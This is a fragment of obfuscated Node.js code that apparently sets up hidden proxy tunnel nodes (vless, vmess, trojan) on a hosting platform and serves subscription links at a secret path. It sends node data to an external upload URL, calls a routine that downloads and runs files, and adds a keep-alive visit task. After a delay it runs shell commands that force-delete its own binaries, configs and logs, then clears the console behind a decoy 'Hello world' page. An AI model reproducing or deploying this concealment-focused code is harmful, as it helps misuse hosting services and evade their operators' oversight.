_0xd8efa6(),_0x522ae4=NAME?NAME+'-'+_0x19e196:_0x19e196;return new Promise(_0x8af634=>{const _0x424a2d={_0x5ed804:0x1fd,_0x38fa8f:0x1b5,_0xe87166:0x1c6,_0x2b032f:0x23f,_0x87a1c7:0x21d,_0x4652ae:0x22f,_0x46b7fd:0x229,_0x6673b3:0x217,_0x38c3e8:0x1f7,_0x19ccb6:0x22d},_0x126a73={_0x394b62:0x1f7,_0x43f7b6:0x23f,_0x224e43:0x212,_0x20bc12:0x1f0};setTimeout(()=>{const _0xd86e17=_0x196a,_0x55d426={'v':'2','ps':''+_0x522ae4,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'auto','net':'ws','type':_0xd86e17(0x27e),'host':_0x955967,'path':_0xd86e17(_0x424a2d._0x5ed804),'tls':_0xd86e17(_0x424a2d._0x38fa8f),'sni':_0x955967,'alpn':'','fp':'firefox'},_0xda690c=_0xd86e17(0x21f)+UUID+'@'+CFIP+':'+CFPORT+_0xd86e17(0x270)+_0x955967+_0xd86e17(0x26d)+_0x955967+_0xd86e17(0x206)+_0x522ae4+'\x0a\x0avmess://'+Buffer['from'](JSON['stringify'](_0x55d426))[_0xd86e17(_0x424a2d._0xe87166)](_0xd86e17(_0x424a2d._0x2b032f))+_0xd86e17(0x1ba)+UUID+'@'+CFIP+':'+CFPORT+_0xd86e17(_0x424a2d._0x87a1c7)+_0x955967+_0xd86e17(0x26d)+_0x955967+_0xd86e17(_0x424a2d._0x4652ae)+_0x522ae4+_0xd86e17(_0x424a2d._0x46b7fd);console[_0xd86e17(_0x424a2d._0x6673b3)](Buffer['from'](_0xda690c)['toString'](_0xd86e17(0x23f))),fs[_0xd86e17(0x1fa)](subPath,Buffer[_0xd86e17(_0x424a2d._0x38c3e8)](_0xda690c)[_0xd86e17(_0x424a2d._0xe87166)]('base64')),console[_0xd86e17(_0x424a2d._0x6673b3)](FILE_PATH+_0xd86e17(0x20d)),uploadNodes(),app[_0xd86e17(_0x424a2d._0x19ccb6)]('/'+SUB_PATH,(_0x326ed2,_0x5bc0ee)=>{const _0x556053=_0xd86e17,_0x261fb4=Buffer[_0x556053(_0x126a73._0x394b62)](_0xda690c)[_0x556053(0x1c6)](_0x556053(_0x126a73._0x43f7b6));_0x5bc0ee[_0x556053(_0x126a73._0x224e43)]('Content-Type',_0x556053(0x277)),_0x5bc0ee[_0x556053(_0x126a73._0x20bc12)](_0x261fb4);}),_0x8af634(_0xda690c);},0x7d0);});}}async function uploadNodes(){const _0x46842f={_0x4e4e7d:0x1ff,_0x138bec:0x217,_0x4dce8b:0x249,_0x1f6224:0x249,_0x411883:0x1c9,_0x136b7f:0x264,_0x2c0ef5:0x20a},_0x40e559=_0x28912e;if(UPLOAD_URL&&PROJECT_URL){const _0x4a4607=PROJECT_URL+'/'+SUB_PATH,_0x108a50={'subscription':[_0x4a4607]};try{const _0x1c2e5b=await axios[_0x40e559(0x20a)](UPLOAD_URL+_0x40e559(_0x46842f._0x4e4e7d),_0x108a50,{'headers':{'Content-Type':_0x40e559(0x1d9)}});return _0x1c2e5b&&_0x1c2e5b[_0x40e559(0x1c7)]===0xc8?(console[_0x40e559(_0x46842f._0x138bec)](_0x40e559(0x1d3)),_0x1c2e5b):null;}catch(_0x31e62f){if(_0x31e62f[_0x40e559(_0x46842f._0x4dce8b)]){if(_0x31e62f[_0x40e559(_0x46842f._0x1f6224)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3bf708=fs['readFileSync'](listPath,_0x40e559(_0x46842f._0x411883)),_0x513968=_0x3bf708[_0x40e559(0x27f)]('\x0a')[_0x40e559(0x209)](_0x1ba933=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x40e559(0x250)](_0x1ba933));if(_0x513968[_0x40e559(_0x46842f._0x136b7f)]===0x0)return;const _0x1b2c6b=JSON['stringify']({'nodes':_0x513968});try{const _0x1df037=await axios[_0x40e559(_0x46842f._0x2c0ef5)](UPLOAD_URL+_0x40e559(0x1ee),_0x1b2c6b,{'headers':{'Content-Type':'application/json'}});return _0x1df037&&_0x1df037['status']===0xc8?(console[_0x40e559(0x217)](_0x40e559(0x1e5)),_0x1df037):null;}catch(_0x17684d){return null;}}else return;}}function cleanFiles(){const _0xc793e5={_0x27d569:0x21e,_0x273b6f:0x21e,_0x58ff70:0x216,_0x9ecbc8:0x276},_0x1f388f={_0x3460e6:0x217,_0x320609:0x217};setTimeout(()=>{const _0x5da769=_0x196a,_0x871053=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x871053[_0x5da769(_0xc793e5._0x27d569)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x871053[_0x5da769(_0xc793e5._0x273b6f)](phpPath);process[_0x5da769(0x1c4)]===_0x5da769(_0xc793e5._0x58ff70)?exec('del\x20/f\x20/q\x20'+_0x871053['join']('\x20')+_0x5da769(0x1db),_0x52bee7=>{const _0x4aaaaa=_0x5da769;console['clear'](),console[_0x4aaaaa(_0x1f388f._0x3460e6)](_0x4aaaaa(0x1f8)),console[_0x4aaaaa(_0x1f388f._0x320609)](_0x4aaaaa(0x237));}):exec(_0x5da769(_0xc793e5._0x9ecbc8)+_0x871053[_0x5da769(0x1dd)]('\x20')+_0x5da769(0x1b4),_0x3ad488=>{const _0x19beb5=_0x5da769;console[_0x19beb5(0x1ca)](),console[_0x19beb5(0x217)]('App\x20is\x20running'),console[_0x19beb5(0x217)](_0x19beb5(0x237));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3ba8a0={_0x17bbec:0x1d9,_0x5b2ed5:0x217},_0x2da8cb=_0x28912e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2da8cb(0x217)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x41af4d=await axios['post'](_0x2da8cb(0x24c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2da8cb(_0x3ba8a0._0x17bbec)}});return console[_0x2da8cb(_0x3ba8a0._0x5b2ed5)](_0x2da8cb(0x266)),_0x41af4d;}catch(_0x6ee399){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x6ee399['message']),null;}}function _0x196a(_0x3c9a33,_0x41deb0){const _0x5990f2=_0x5990();return _0x196a=function(_0x196ae3,_0xd04e92){_0x196ae3=_0x196ae3-0x1b4;let _0x222de9=_0x5990f2[_0x196ae3];return _0x222de9;},_0x196a(_0x3c9a33,_0x41deb0);}async function startserver(){const _0x19ccbd={_0x5af83e:0x1bb},_0x3eeef2=_0x28912e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x8ca530){console[_0x3eeef2(_0x19ccbd._0x5af83e)](_0x3eeef2(0x213),_0x8ca530);}}startserver()[_0x28912e(0x238)](_0x22e768=>{const _0x3afcb4=_0x28912e;console[_0x3afcb4(0x1bb)]('Unhandled\x20error\x20in\x20startserver:',_0x22e768);}),app[_0x28912e(0x22d)]('/',async function(_0x34fa3f,_0x1613ea){const _0x42f1c8={_0x312673:0x273,_0x4db7ec:0x234,_0x449553:0x207,_0x38ef55:0x1f0},_0x194de8=_0x28912e;try{const _0x1a3fc6=path['join'](__dirname,_0x194de8(_0x42f1c8._0x312673)),_0x1e6431=await fs['promises'][_0x194de8(_0x42f1c8._0x4db7ec)](_0x1a3fc6,_0x194de8(_0x42f1c8._0x449553));_0x1613ea[_0x194de8(0x1f0)](_0x1e6431);}catch(_0x5ef242){_0x1613ea[_0x194de8(_0x42f1c8._0x38ef55)]('Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!');}}),app[_0x28912e(0x23e)](PORT,()=>console[_0x28912e(0x217)](_0x28912e(0x233)+PORT+'!'));